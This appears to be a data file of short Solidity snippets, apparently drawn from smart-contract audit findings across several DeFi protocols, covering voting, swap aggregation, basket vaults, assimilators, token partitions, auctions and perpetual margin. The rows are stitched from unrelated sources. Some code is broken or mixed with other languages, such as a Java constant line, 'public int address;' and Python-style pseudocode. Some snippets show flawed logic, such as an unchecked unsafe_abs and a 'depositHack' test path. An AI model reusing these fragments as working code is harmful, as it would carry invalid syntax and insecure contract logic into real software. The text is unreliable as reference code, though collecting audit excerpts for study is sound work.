"```\nrequire(\n    _proposal.voters[_voter].nonce < _relayerNonce,\n    ""INVALID_NONCE""\n);\n```\nif (_cachedVoter.balance > 0) {\n    _proposal.votes[_cachedVoter.vote] = \n        _proposal.votes[_cachedVoter.vote].sub(_cachedVoter.balance.mul(_cachedVoter.weight));\n    _proposal.totalVotes = _proposal.totalVotes.sub(1);\n    voter.weight = 0;\n    voter.balance = 0;\n    voter.vote = 0;\n    voter.asset = address(0);\n    emit VoteCancelled(\n        _proposalId,\n        _voter,\n        _cachedVoter.vote,\n        _cachedVoter.asset,\n        _cachedVoter.weight,\n        _cachedVoter.balance,\n        uint256(_proposal.proposalStatus)\n    );\n}\n```"
```\nuint256 _votingPower = _voterAssetBalance.mul(_assetWeight);\n```\n```\n_proposal.votes[_cachedVoter.vote] = \n    _proposal.votes[_cachedVoter.vote].sub(\n        _cachedVoter.balance.mul(_cachedVoter.weight)\n    )\n_proposal.totalVotes = _proposal.totalVotes.sub(1)\n```
"```\nif (address(tokenTo)!= Constants.ETH) {\n    uint256 balance = tokenTo.balanceOf(address(this));\n    require(balance >= amountTo, ""INSUFFICIENT_AMOUNT"");\n    _transfer(tokenTo, balance, recipient);\n} else {\n```"
"```\nuint256 fee = msg.value;\n\nif (address(tokenFrom) == Constants.ETH) {\n    require(amountFrom <= fee, ""MSG_VAL_INSUFFICIENT"");\n    fee -= amountFrom;\n    IWETH weth = getWETH();\n    weth.deposit{value: amountFrom}();\n    _approveSpender(weth, spender, amountFrom);\n} else {\n    _approveSpender(tokenFrom, spender, amountFrom);\n}\n\naggregator.functionCallWithValue(abi.encodePacked(method, data), fee);\n```"
"```\nfunction swap(\n    string calldata aggregatorId,\n    IERC20 tokenFrom,\n    uint256 amount,\n    bytes calldata data\n) external payable whenNotPaused nonReentrant {\n    Adapter storage adapter = adapters[aggregatorId];\n\n    if (address(tokenFrom)!= Constants.ETH) {\n        tokenFrom.safeTransferFrom(msg.sender, address(spender), amount);\n    }\n\n    spender.swap{value: msg.value}(\n        adapter.addr,\n```\n```\nfunction swap(address adapter, bytes calldata data) external payable {\n    require(adapter!= address(0), ""ADAPTER_NOT_SUPPORTED"");\n```"
"```\n_settleRedemption(\n    _recipient,\n    _mAssetQuantity,\n    props.bAssets,\n    bAssetQuantities,\n    props.indexes,\n    props.integrators,\n    false\n)"
```\nuint256 timeSinceLastCollection = now.sub(previousCollection);\n\nif (timeSinceLastCollection > THIRTY_MINUTES) {\n```
"```\nquantityDeposited = _amount;\n\nif (_isTokenFeeCharged) {\n    uint256 prevBal = _checkBalance(cToken);\n    require(cToken.mint(_amount) == 0, ""cToken mint failed"");\n    uint256 newBal = _checkBalance(cToken);\n    quantityDeposited = _min(quantityDeposited, newBal.sub(prevBal));\n} else {\n    require(cToken.mint(_amount) == 0, ""cToken mint failed"");\n}\n\nemit Deposit(_bAsset, address(cToken), quantityDeposited);\n```\n```\nbasketManager.increaseVaultBalance(\n    bInfo.index,\n    integrator,\n    quantityDeposited\n)\n```\nuint256 deposited = IPlatformIntegration(_integrator).deposit(\n    _bAsset,\n    quantityTransferred,\n    _erc20TransferFeeCharged\n);\n```\nuint256 balance = IPlatformIntegration(integrations[i]).checkBalance(b.addr);\nuint256 oldVaultBalance = b.vaultBalance;\n\nif (balance > oldVaultBalance && b.status == BassetStatus.Normal) {\n    // accumulate interest (ratioed bAsset)\n    basket.bassets[i].vaultBalance = balance;\n}\n```"
"```\nuint256 colRatio = StableMath.min(props.colRatio, StableMath.getFullScale());\n\nuint256 collateralisedMassetQuantity = _mAssetQuantity.mulTruncate(colRatio);\n```"
"```\nrequire(bAsset.vaultBalance == 0, ""bAsset vault must be empty"")\n```"
"```\nrequire(\n    _measurementMultiple >= 1e6 && _measurementMultiple <= 1e10,\n    ""MM out of range""\n)"
"```\nrequire\n  extrapolatedAPY < MAX_APY,\n  ""Interest protected from inflating past maxAPY""\n```"
"```\nIPlatformIntegration(_integration).checkBalance(_bAsset)\n```\n```\nIPlatformIntegration(_integrators[i]).withdraw(\n    _recipient,\n    bAsset,\n    q,\n    _bAssets[i].isTransferFeeCharged\n)\n```\nrequire(bAssetToPToken[_bAsset] == address(0), ""pToken already set"")\n```"
"```\nuint256 bAsset_decimals = CommonHelpers.getDecimals(_bAsset);\n```\n```\nrequire(\n    decimals >= 4 && decimals <= 18,\n    ""Token must have sufficient decimal places""\n)\n```\nfunction setTransferFeesFlag(address _bAsset, bool _flag)\n```"
```\n/**\n * @dev All details needed to Forge with multiple bAssets\n */\nstruct ForgePropsMulti {\n    bool isValid; // Flag to signify that forge bAssets have passed validity check\n    Basset[] bAssets;\n    address[] integrators;\n    uint8[] indexes;\n}\n```\n```\nif (not props.isValid):\n    return 0\n```
"```\n/**\n * @dev Status of the Basset - has it broken its peg?\n */\nenum BassetStatus {\n    Default,\n    Normal,\n    BrokenBelowPeg,\n    BrokenAbovePeg,\n    Blacklisted,\n    Liquidating,\n    Liquidated,\n    Failed\n}\n```\n```\n_bAsset.status == BassetStatus.Liquidating or\n_bAsset.status == BassetStatus.Blacklisted\n```"
"```\nif (atLeastOneBecameOverweight):\n    return (false, ""bAssets must remain below max weight"", false)\n```"
"```\nrequire(weightSum >= 1e18 && weightSum <= 4e18,\n        ""Basket weight must be >= 100 && <= 400"")\n```\n```\n/**\n * @dev Throws if the total Basket weight does not sum to 100\n*/"
"```\nIPoolTokensContainer(anchor).burn(_poolToken, msg.sender, _amount);\n\nuint256 reserveAmount = 0;\nif (_amount == initialPoolSupply) {\n    reserveAmount = balance;\n} else {\n    reserveAmount = _amount.mul(balance).div(initialPoolSupply);\n\nreserves[reserveToken].balance = reserves[reserveToken].balance.sub(reserveAmount);\nuint256 newStakedBalance = stakedBalances[reserveToken].sub(reserveAmount);\nstakedBalances[reserveToken] = newStakedBalance;\n```"
```\n_to.transfer(address(this).balance)\n```\n```\nif (_targetToken == ETH_RESERVE_ADDRESS)\n```\n```\nmsg.sender.transfer(reserveAmount)\n```
```\nassert amount < targetReserveBalance\n```
"```\nfunction includeAsset(\n    address _numeraire,\n    address _nAssim,\n    address _reserve,\n    address _rAssim,\n    uint256 _weight\n) public onlyOwner {\n    shell.includeAsset(_numeraire, _nAssim, _reserve, _rAssim, _weight);\n}\n```\n```\nfunction includeAsset(\n    Shells.Shell storage shell,\n    address _numeraire,\n    address _numeraireAssim,\n    address _reserve,\n    address _reserveAssim,\n    uint256 _weight\n) internal {\n    Assimilators.Assimilator storage _numeraireAssimilator = shell.assimilators[_numeraire];\n\n    _numeraireAssimilator.addr = _numeraireAssim;\n    _numeraireAssimilator.ix = uint8(shell.numeraires.length);\n\n    shell.numeraires.push(_numeraireAssimilator);\n\n    Assimilators.Assimilator storage _reserveAssimilator = shell.assimilators[_reserve];\n\n    _reserveAssimilator.addr = _reserveAssim;\n    _reserveAssimilator.ix = uint8(shell.reserves.length);\n\n    shell.reserves.push(_reserveAssimilator);\n\n    shell.weights.push(_weight.divu(1e18).add(uint256(1).divu(1e18)));\n}\n```\n```\nfunction includeAssimilator(\n    address _numeraire,\n    address _derivative,\n    address _assimilator\n) public onlyOwner {\n    shell.includeAssimilator(_numeraire, _derivative, _assimilator);\n}\n```\n```\nfunction includeAssimilator(\n    Shells.Shell storage shell,\n    address _numeraire,\n    address _derivative,\n    address _assimilator\n) internal {\n    Assimilators.Assimilator storage _numeraireAssim = shell.assimilators[_numeraire];\n\n    shell.assimilators[_derivative] = Assimilators.Assimilator(_assimilator, _numeraireAssim.ix);\n}\n```\n```\nfunction swapByOrigin(\n    address _o,\n    address _t,\n    uint256 _oAmt,\n    uint256 _mTAmt,\n    uint256 _dline\n) public notFrozen returns (uint256 tAmt_) {\n    return transferByOrigin(\n        _o,\n        _t,\n        _dline,\n        _mTAmt,\n        _oAmt,\n        msg.sender\n    );\n}\n```\n```\nfunction transferByOrigin(\n    address _origin,\n    address _target,\n    uint256 _dline,\n    uint256 _mTAmt,\n    uint256 _oAmt,\n    address _rcpnt\n) public notFrozen nonReentrant returns (uint256 tAmt_) {\n    Assimilators.Assimilator memory _o = shell.assimilators[_origin];\n    Assimilators.Assimilator memory _t = shell.assimilators[_target];\n\n    if (_o.ix == _t.ix) {\n        return _t.addr.outputNumeraire(_rcpnt, _o.addr.intakeRaw(_oAmt));\n    }\n```\n```\nfunction intakeRaw(uint256 _amount) public returns (int128 amount_, int128 balance_) {\n    dai.transferFrom(msg.sender, address(this), _amount);\n\n    amount_ = _amount.divu(1e18);\n}\n```\n```\nfunction outputNumeraire(address _dst, int128 _amount) public returns (uint256 amount_) {\n    amount_ = _amount * (1e18);\n\n    dai.transfer(_dst, amount_);\n\n    return amount_;\n}\n```"
"```\nfunction safeApprove(address _token, address _spender, uint256 _value) public onlyOwner {\n    (bool success, bytes memory returndata) = _token.call(abi.encodeWithSignature(""approve(address,uint256)"", _spender, _value));\n\n    require(success, ""SafeERC20: low-level call failed"");\n}\n```"
"```\nfunction swapByOrigin(\n    address _o,\n    address _t,\n    uint256 _oAmt,\n    uint256 _mTAmt,\n    uint256 _dline\n) public notFrozen returns (uint256 tAmt_) {\n    return transferByOrigin(\n        _o,\n        _t,\n        _dline,\n        _mTAmt,\n        _oAmt,\n        msg.sender\n    );\n}\n```\n```\nif (_o.ix == _t.ix):\n    return _t.addr.outputNumeraire(_rcpnt, _o.addr.intakeRaw(_oAmt))\n```\n```\nfunction intakeRaw(uint256 _amount) public returns (int128 amount_) {\n    bool success = cdai.transferFrom(msg.sender, address(this), _amount);\n\n    if (!success) {\n        revert(""CDai/transferFrom-failed"");\n    }\n\n    uint256 _rate = cdai.exchangeRateStored();\n\n    _amount = (_amount * _rate) / 1e18;\n\n    cdai.redeemUnderlying(_amount);\n\n    amount_ = _amount.divu(1e18);\n}\n```\n```\nfunction intakeRaw(uint256 _amount) public returns (int128 amount_, int128 balance_) {\n    dai.transferFrom(msg.sender, address(this), _amount);\n\n    amount_ = _amount.divu(1e18);\n}\n```"
"```\ndai.transferFrom(\n    msg.sender,\n    address(this),\n    _amount\n)\n```\ndai.transfer(_dst, _amount)\n```"
"```\nfunction viewNumeraireAmount(address _assim, uint256 _amt) internal returns (int128 amt_) {\n    bytes memory data = abi.encodeWithSelector(iAsmltr.viewNumeraireAmount.selector, _amt);\n    amt_ = abi.decode(_assim.delegate(data), (int128));\n}\n```"
"```\n/**\n * Calculate x + y. Revert on overflow.\n *\n * @param x signed 64.64-bit fixed point number\n * @param y signed 64.64-bit fixed point number\n * @return signed 64.64-bit fixed point number\n */\nfunction add(int128 x, int128 y) internal pure returns (int128) {\n    int256 result = int256(x) + y;\n    require(result >= MIN_64x64 && result <= MAX_64x64);\n    return int128(result);\n}\n```\n```\n/**\n * Calculate x + y. Revert on overflow.\n *\n * @param x signed 64.64-bit fixed point number\n * @param y signed 64.64-bit fixed point number\n * @return signed 64.64-bit fixed point number\n */\nfunction unsafe_add(int128 x, int128 y) internal pure returns (int128) {\n    int256 result = int256(x) + y;\n    require(result >= MIN_64x64 && result <= MAX_64x64);\n    return int128(result);\n}\n```\n```\n/**\n * Calculate |x|. Revert on overflow.\n *\n * @param x signed 64.64-bit fixed point number\n * @return signed 64.64-bit fixed point number\n */\nfunction abs(int128 x) internal pure returns (int128) {\n    require(x!= MIN_64x64);\n    return x < 0? -x : x;\n}\n```\n```\n/**\n * Calculate |x|. Revert on overflow.\n *\n * @param x signed 64.64-bit fixed point number\n * @return signed 64.64-bit fixed point number\n */\nfunction unsafe_abs(int128 x) internal pure returns (int128) {\n    return x < 0? -x : x;\n}\n```\n```\nrequire(x!= MIN_64x64);\n```\n```\nprivate static final int MIN_64x64 = -0x80000000000000000000000000000000;\n```"
"```\nlibrary SafeERC20Arithmetic {\n```\n```\nlibrary Shells {\n```\n```\ncontract ERC20Approve {\n    function approve(address spender, uint256 amount) public returns (bool);\n}\n```\ncontract Loihi is LoihiRoot {\n```\n```\nlibrary Delegate {\n```\n```\nlibrary Assimilators {\n```"
"```\nevent log(bytes32);\n\nevent log_int(bytes32, int256);\n\nevent log_ints(bytes32, int256[]);\n\nevent log_uint(bytes32, uint256);\n\nevent log_uints(bytes32, uint256[]);\n```\n```\nevent log(bytes32);\n\nevent log_uint(bytes32, uint256);\n\nevent log_int(bytes32, int256);\n```\n```\nevent log(bytes32);\n\nevent log_int(bytes32, int128);\nevent log_int(bytes32, int);\n\nevent log_uint(bytes32, uint);\n\nevent log_addr(bytes32, address);\n```\n```\nevent log(bytes32);\n```\n```\nevent log(bytes32);\n\nevent log_int(bytes32, int256);\n\nevent log_ints(bytes32, int256[]);\n\nevent log_uint(bytes32, uint256);\n\nevent log_uints(bytes32, uint256[]);\n```\n```\nevent log_int(bytes32, int);\nevent log_ints(bytes32, int128[]);\nevent log_uint(bytes32, uint);\nevent log_uints(bytes32, uint[]);\nevent log_addrs(bytes32, address[]);\n```\n```\nevent log_uint(bytes32, uint256);\n\nevent log_int(bytes32, int256);\n```\n```\nevent log_uint(bytes32, uint256);\n```\n```\nshell.testHalts = true;\n```\n```\nfunction setTestHalts(bool _testOrNotToTest) public {\n    shell.testHalts = _testOrNotToTest;\n}\n```\n```\nbool testHalts;\n```"
"```\nfunction viewRawAmount(address _assim, int128 _amt) internal returns (uint256 amount_) {\n    bytes memory data = abi.encodeWithSelector(iAsmltr.viewRawAmount.selector, _amt.abs()); // for development\n    amount_ = abi.decode(_assim.delegate(data), (uint256)); // for development\n}\n```\n```\nfunction viewNumeraireAmount(address _assim, uint256 _amt) internal returns (int128 amt_) {\n    bytes memory data = abi.encodeWithSelector(iAsmltr.viewNumeraireAmount.selector, _amt);\n    amt_ = abi.decode(_assim.delegate(data), (int128));\n}\n```\n```\nfunction viewNumeraireAmount(address _assim, uint256 _amt) internal returns (int128 amt_) {\n    bytes memory data = abi.encodeWithSelector(iAsmltr.viewNumeraireAmount.selector, _amt);\n    amt_ = abi.decode(_assim.delegate(data), (int128));\n}\n```\n```\nfunction includeAssimilator(\n    Shells.Shell storage shell,\n    address _numeraire,\n    address _derivative,\n    address _assimilator\n) internal {\n    Assimilators.Assimilator storage _numeraireAssim = shell.assimilators[_numeraire];\n\n    shell.assimilators[_derivative] = Assimilators.Assimilator(_assimilator, _numeraireAssim.ix);\n}\n```\n```\nfunction transfer(address _recipient, uint256 _amount) public nonReentrant returns (bool) {\n    return shell.transfer(_recipient, _amount);\n}\n\nfunction transferFrom(address _sender, address _recipient, uint256 _amount) public nonReentrant returns (bool) {\n    return shell.transferFrom(_sender, _recipient, _amount);\n}\n\nfunction approve(address _spender, uint256 _amount) public nonReentrant returns (bool) {\n    return shell.approve(_spender, _amount);\n}\n\nfunction increaseAllowance(address _spender, uint256 _addedValue) public returns (bool) {\n    return shell.increaseAllowance(_spender, _addedValue);\n}\n\nfunction decreaseAllowance(address _spender, uint256 _subtractedValue) public returns (bool) {\n    return shell.decreaseAllowance(_spender, _subtractedValue);\n}\n\nfunction balanceOf(address _account) public view returns (uint256) {\n    return shell.balances[_account];\n}\n```\n```\nfunction test_s1_selectiveDeposit_noSlippage_balanced_10DAI_10USDC_10USDT_2p5SUSD_NO_HACK() public logs_gas {\n    uint256 newShells = super.noSlippage_balanced_10DAI_10USDC_10USDT_2p5SUSD();\n    assertEq(newShells, 32499999216641686631);\n}\n\nfunction test_s1_selectiveDeposit_noSlippage_balanced_10DAI_10USDC_10USDT_2p5SUSD_HACK() public logs_gas {\n    uint256 newShells = super.noSlippage_balanced_10DAI_10USDC_10USDT_2p5SUSD_HACK();\n    assertEq(newShells, 32499999216641686631);\n}\n```\n```\nfunction noSlippage_balanced_10DAI_10USDC_10USDT_2p5SUSD_HACK() public returns (uint256 shellsMinted_) {\n    uint256 startingShells = l.proportionalDeposit(300e18);\n    uint256 gas = gasleft();\n    shellsMinted_ = l.depositHack(\n        address(dai), 10e18,\n        address(usdc), 10e6,\n        address(usdt), 10e6,\n        address(susd), 2.5e18\n    );\n    emit LogUint(""gas for deposit"", gas - gasleft());\n}\n```"
"```\nfunction includeAsset(\n    address _numeraire,\n    address _nAssim,\n    address _reserve,\n    address _rAssim,\n    uint256 _weight\n) public onlyOwner {\n    shell.includeAsset(_numeraire, _nAssim, _reserve, _rAssim, _weight);\n}\n```\n```\nfunction includeAsset(\n    Shells.Shell storage shell,\n    address _numeraire,\n    address _numeraireAssim,\n    address _reserve,\n    address _reserveAssim,\n    uint256 _weight\n) internal {\n```\n```\nshell.numeraires.push(_numeraireAssimilator);"
"```\nfunction intakeNumeraire(int128 _amount) public returns (uint256 amount_) {\n    amount_ = _amount * (1e18) / (1e3 * 1e3);\n\n    dai.transferFrom(msg.sender, address(this), amount_);\n}\n```\n```\nfunction outputNumeraire(address _dst, int128 _amount) public returns (uint256 amount_) {\n    amount_ = _amount * (1e18);\n\n    dai.transfer(_dst, amount_);\n\n    return amount_;\n}\n```\n```\nshell.numeraires[i].addr.intakeNumeraire(\n    _shells.mul(shell.weights[i])\n)\n```\nshell.numeraires[i].addr.intakeNumeraire(\n    _oBals[i].mul(_multiplier)\n)\n```\nshell.reserves[i].addr.outputNumeraire(msg.sender, _oBals[i].mul(_multiplier))\n```\n```\nunit = shell.numeraires[i].addr.intakeNumeraire(_shells.mul(shell.weights[i]))\n\nrequire(unit > 0, ""Must intake a positive number of tokens"")\n```"
```\nIAssimilator constant iAsmltr = IAssimilator(address(0));\n```
"```\nfunction add(uint x, uint y) internal pure returns (uint z) {\n    require((z = x + y) >= x, ""add-overflow"");\n}\n```\n```\nfunction sub(uint x, uint y, string memory _errorMessage) internal pure returns (uint z) {\n    require((z = x - y) <= x, _errorMessage);\n}\n```"
```\nfunction freeze(bool _freeze) public onlyOwner {\n    frozen = _freeze;\n}\n```
```\nfunction supportsInterface(bytes4 interfaceID) public returns (bool) {\n    return interfaceID == ERC20ID || interfaceID == ERC165ID;\n}\n```
"```\nshell.assimilators[_derivative] = Assimilators.Assimilator(_assimilator, _numeraireAssim.ix)\n```\n```\ndelete shell.assimilators[_assimilator];\n```"
"```\nassembly {\n    flag := mload(add(_data, 32))\n}\n\nif (flag == CHANGE_PARTITION_FLAG) {\n    assembly {\n        toPartition := mload(add(_data, 64))\n```\n```\nassembly {\n    toPartition := mload(add(_data, 64))\n}\n```\n```\nfor (uint256 i = 116; i <= _operatorData.length; i = i + 32) {\n    bytes32 temp;\n    assembly {\n        temp := mload(add(_operatorData, i))\n    }\n    proof[index] = temp;\n    index++;\n}\n```"
"```\nswapToken.transferFrom(\n    _from,\n    swapTokenGraveyard,\n    amount\n)"
"```\nrequire(\n    _isOperatorForPartition(_partition, msg.sender, _from) ||\n        (_value <= _allowedByPartition[_partition][_from][msg.sender]),\n    EC_53_INSUFFICIENT_ALLOWANCE\n);\n```"
```\naddressToWithdrawalNonce[_partition][supplier] = withdrawalRootNonce;\n```\naddressToWithdrawalNonce[_partition][supplier] = maxWithdrawalRootNonce;\n```\nmaxWithdrawalRootNonce = _nonce;
"```\nuint256 proofNb = (_operatorData.length - 84) / 32;\nbytes32[] memory proof = new bytes32[](proofNb);\nuint256 index = 0;\n\nfor (uint256 i = 116; i <= _operatorData.length; i = i + 32) {\n    bytes32 temp;\n    assembly {\n        temp := mload(add(_operatorData, i))\n    }\n    proof[index] = temp;\n    index++;\n}\n```"
"```\nrequire(\n    _balanceOfByPartition[_from][_fromPartition] >= _value,\n    EC_52_INSUFFICIENT_BALANCE\n);\n\nbytes32 toPartition = _fromPartition;\nif (_data.length >= 64) {\n    toPartition = _getDestinationPartition(_fromPartition, _data);\n}\n\n_callPreTransferHooks(\n    _fromPartition,\n    _operator,\n    _from,\n    _to,\n    _value,\n    _data,\n    _operatorData\n);\n\n_removeTokenFromPartition(_from, _fromPartition, _value);\n_transfer(_from, _to, _value);\n_addTokenToPartition(_to, toPartition, _value);\n\n_callPostTransferHooks(\n    toPartition,\n```"
"```\nrequire(_isOperator(msg.sender, _from), EC_58_INVALID_OPERATOR);\n```\n```\nrequire(\n    _operator!= msg.sender\n);\n```\n```\nrequire(\n    _operator!= msg.sender\n);\n```"
"```\nemit ApprovalByPartition(\n    _partition,\n    _tokenHolder,\n    _spender,\n    _amount\n);"
"```\nrequire(msg.sender == amp, ""Invalid sender"");\n```"
"```\nERC1820Implementer._setInterface(AMP_INTERFACE_NAME);\nERC1820Implementer._setInterface(ERC20_INTERFACE_NAME);\nERC1820Implementer._setInterface(ERC777_INTERFACE_NAME);\n```\n```\n/**\n * @notice Indicates a supply refund was executed\n * @param supplier Address whose refund authorization was executed\n * @param partition Partition from which the tokens were transferred\n * @param amount Amount of tokens transferred\n * @param nonce Indexed nonce\n */\nevent SupplyRefund(\n    address indexed supplier,\n    bytes32 indexed partition,\n    uint256 amount,\n    uint256 indexed nonce\n);\n```"
```\npublic ISwapToken swapToken;\n```\npublic constant address swapTokenGraveyard = 0x000000000000000000000000000000000000dEaD;\n```\n```\naddress[] public collateralManagers;\n```\n```\nbytes4[] public partitionStrategies;\n```\n```\nmapping(bytes32 => bool) public partitions;\n```\n```\nmapping (uint256 => Supply) public nonceToSupply;\n```\n```\nmapping(bytes32 => uint256) public withdrawalRootToNonce;\n```
```\nstring internal _name;\n```\n```\nstring internal _symbol;\n```\n```\npublic ISwapToken swapToken;\n```\npublic int address;\n```
"```\nfunction _transferETH(address _recipient, uint256 _amount) private {\n    (bool success, ) = _recipient.call{value: _amount}(\n        abi.encodeWithSignature("""")\n    );\n    require(success, ""Transfer Failed"");\n}\n```"
"```\nfunction _transferETH(address _recipient, uint256 _amount) private {\n```"
"```\nfunction setIDOLContract(address contractAddress) public {\n    require(address(_IDOLContract) == address(0), ""IDOL contract is already registered"");\n    _setStableCoinContract(contractAddress);\n}\n```"
"```\nfunction isNotStartedAuction(bytes32 auctionID) public virtual override returns (bool) {\n    uint256 closingTime = _auctionClosingTime[auctionID];\n    return closingTime == 0;\n}\n\nfunction inAcceptingBidsPeriod(bytes32 auctionID) public virtual override returns (bool) {\n    uint256 closingTime = _auctionClosingTime[auctionID];\n```\n```\nfunction isNotStartedAuction(bytes32 auctionID)\n    public\n    virtual\n    override\n    returns (bool)\n{\n    return true;\n}\n\nfunction inAcceptingBidsPeriod(bytes32 auctionID)\n```\n```\nrequire(\n    inRevealingValuationPeriod(auctionID),\n    ""it is not the time to reveal the value of bids""\n);"
"```\nfunction revealBid(\n    bytes32 auctionID,\n    uint256 price,\n    uint256 targetSBTAmount,\n    uint256 random\n) public override {\n    require(\n        inRevealingValuationPeriod(auctionID),\n        ""it is not the time to reveal the value of bids""\n    );\n```\n```\n/**\n * @dev Penalties for revealing too early.\n * Some participants may not follow the rule and publicate their bid information before the reveal process.\n * In such a case, the bid price is overwritten by the bid with the strike price (slightly unfavored price).\n */\nuint256 bidPrice = price;\n\n/**\n * @dev\n */\nif (inAcceptingBidsPeriod(auctionID)) {\n    // if (false) {\n    (,, uint256 solidStrikePriceE4, ) = _getBondFromAuctionID(auctionID);\n    bidPrice = _exchangeSBT2IDOL(solidStrikePriceE4.mul(10**18));\n}\n```"
```\nif (nextBoxNumber > 1 \n    && nextBoxNumber > nextExecuteBoxNumber) {\n```\n```\nif (nextBoxNumber > 1 \n    && nextBoxNumber > nextExecuteBoxNumber) {\n```\n```\nif (nextBoxNumber > 1 && nextBoxNumber >= nextExecuteBoxNumber):\n```
"```\nlibrary DecimalSafeMath {\n    function decimalDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 a_ = a * 1000000000000000000;\n        uint256 c = a_ / b;\n        return c;\n    }\n}\n```\nlibrary DecimalSafeMath {\n\n    function decimalDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = (a * 1000000000000000000) / b;\n        return c;\n    }\n}"
"```\nfunction cancelOrder(LibOrder.Order memory order) public {\n    require(msg.sender == order.trader || msg.sender == order.broker, ""invalid caller"");\n\n    bytes32 orderHash = order.getOrderHash();\n    cancelled[orderHash] = true;\n\n    emit Cancel(orderHash);\n}\n```"
"```\nfunction withdraw(uint256 amount) public {\n    withdrawFromAccount(msg.sender, amount);\n}\n```\n```\nfunction withdrawFromAccount(address payable guy, uint256 amount) private {\n    require(guy!= address(0), ""invalid guy"");\n    require(status!= LibTypes.Status.SETTLING, ""wrong perpetual status"");\n\n    uint256 currentMarkPrice = markPrice();\n    require(isSafeWithPrice(guy, currentMarkPrice), ""unsafe before withdraw"");\n\n    remargin(guy, currentMarkPrice);\n\n    address broker = currentBroker(guy);\n    bool forced = broker == address(amm.perpetualProxy()) || broker == address(0);\n    withdraw(guy, amount, forced);\n\n    require(isSafeWithPrice(guy, currentMarkPrice), ""unsafe after withdraw"");\n    require(availableMarginWithPrice(guy, currentMarkPrice) >= 0, ""withdraw margin"");\n}\n```\n```\nfunction withdrawFor(address payable guy, uint256 amount) public onlyWhitelisted {\n    require(status == LibTypes.Status.NORMAL, ""wrong perpetual status"");\n    withdrawFromAccount(guy, amount);\n}\n```"
"```\nfunction withdrawFromInsuranceFund(uint256 rawAmount) public onlyWhitelistAdmin {\n    require(rawAmount > 0, ""invalid amount"");\n    require(insuranceFundBalance > 0, ""insufficient funds"");\n    require(rawAmount <= insuranceFundBalance, ""insufficient funds"");\n\n    int256 wadAmount = toWad(rawAmount);\n    insuranceFundBalance = insuranceFundBalance.sub(wadAmount);\n    withdrawFromProtocol(msg.sender, rawAmount);\n\n    require(insuranceFundBalance >= 0, ""insurance fund balance cannot be negative"");\n\n    emit UpdateInsuranceFund(insuranceFundBalance);\n}\n```\n```\nawait perpetual.withdrawFromInsuranceFund(toWad(10.111));\n\nfund = await perpetual.insuranceFundBalance();\nassert.equal(fund.toString(), '0');\n```"
"```\nfunction isSafeWithPrice(address guy, uint256 currentMarkPrice) public returns (bool) {\n    return marginBalanceWithPrice(guy, currentMarkPrice) >=\n        uint256(maintenanceMarginWithPrice(guy, currentMarkPrice));\n}\n```\nfunction liquidateFrom(address from, address guy, uint256 maxAmount) public returns (uint256, uint256) {\n    // Your code here\n}\n```\nfunction liquidate(address guy, uint256 maxAmount) public returns (uint256, uint256) {\n    require(status!= LibTypes.Status.SETTLED, ""wrong perpetual status"");\n    return liquidateFrom(msg.sender, guy, maxAmount);\n}\n```"
"```\nfunction setGlobalParameter(bytes32 key, uint256 value) public onlyWhitelistAdmin {\n    if (key == ""withdrawalLockBlockCount"") {\n        withdrawalLockBlockCount = value;\n    } else if (key == ""brokerLockBlockCount"") {\n        brokerLockBlockCount = value;\n    } else {\n        revert(""key not exists"");\n    }\n    emit UpdateGlobalParameter(key, value);\n}\n```\n```\nfunction setGovernanceParameter(bytes32 key, int256 value) public onlyWhitelistAdmin {\n    if (key == ""initialMarginRate"") {\n        governance.initialMarginRate = value.toUint256();\n        require(governance.initialMarginRate > 0, ""require im > 0"");\n        require(governance.initialMarginRate < 10**18, ""require im < 1"");\n        require(governance.maintenanceMarginRate < governance.initialMarginRate, ""require mm < im"");\n    } else if (key == ""maintenanceMarginRate"") {\n        governance.maintenanceMarginRate = value.toUint256();\n        require(governance.maintenanceMarginRate > 0, ""require mm > 0"");\n        require(governance.maintenanceMarginRate < governance.initialMarginRate, ""require mm < im"");\n        require(governance.liquidationPenaltyRate < governance.maintenanceMarginRate, ""require lpr < mm"");\n        require(governance.penaltyFundRate < governance.maintenanceMarginRate, ""require pfr < mm"");\n    } else if (key == ""liquidationPenaltyRate"") {\n        governance.liquidationPenaltyRate = value.toUint256();\n        require(governance.liquidationPenaltyRate < governance.maintenanceMarginRate, ""require lpr < mm"");\n    } else if (key == ""penaltyFundRate"") {\n        governance.penaltyFundRate = value.toUint256();\n        require(governance.penaltyFundRate < governance.maintenanceMarginRate, ""require pfr < mm"");\n    } else if (key == ""takerDevFeeRate"") {\n        governance.takerDevFeeRate = value;\n    } else if (key == ""makerDevFeeRate"") {\n        governance.makerDevFeeRate = value;\n    } else if (key == ""lotSize"") {\n        require(governance.tradingLotSize == 0 || governance.tradingLotSize.mod(value.toUint256()) == 0, ""require tls % ls == 0"");\n        governance.lotSize = value.toUint256();\n    } else if (key == ""tradingLotSize"") {\n        require(governance.lotSize == 0 || value.toUint256().mod(governance.lotSize) == 0, ""require tls % ls == 0"");\n        governance.tradingLotSize = value.toUint256();\n    } else if (key == ""longSocialLossPerContracts"") {\n        require(status == LibTypes.Status.SET\n```\nfunction setGovernanceAddress(bytes32 key, address value) public onlyWhitelistAdmin {\n    require(value!= address(0x0), ""invalid address"");\n    if (key == ""dev"") {\n        devAddress = value;\n    } else if (key == ""amm"") {\n        amm = IAMM(value);\n    } else if (key == ""globalConfig"") {\n        globalConfig = IGlobalConfig(value);\n    } else {\n        revert(""key not exists"");\n    }\n    emit UpdateGovernanceAddress(key, value);\n}\n```\n```\nfunction setGovernanceParameter(bytes32 key, int256 value) public onlyWhitelistAdmin {\n    if (key == ""poolFeeRate"") {\n        governance.poolFeeRate = value.toUint256();\n    } else if (key == ""poolDevFeeRate"") {\n        governance.poolDevFeeRate = value.toUint256();\n    } else if (key == ""emaAlpha"") {\n        require(value > 0, ""alpha should be > 0"");\n        governance.emaAlpha = value;\n        emaAlpha2 = 10**18 - governance.emaAlpha;\n        emaAlpha2Ln = emaAlpha2.log();\n    } else if (key == ""updatePremiumPrize"") {\n        governance.updatePremiumPrize = value.toUint256();\n    } else if (key == ""markPremiumLimit"") {\n        governance.markPremiumLimit = value;\n    } else if (key == ""fundingDampener"") {\n        governance.fundingDampener = value;\n    } else {\n        revert(""key not exists"");\n    }\n    emit UpdateGovernanceParameter(key, value);\n}\n```"
"```\n} else if (key == ""emaAlpha"") {\n    require(value > 0, ""alpha should be > 0"");\n    governance.emaAlpha = value;\n    emaAlpha2 = 10 ** 18 - governance.emaAlpha;\n    emaAlpha2Ln = emaAlpha2.log();\n```"
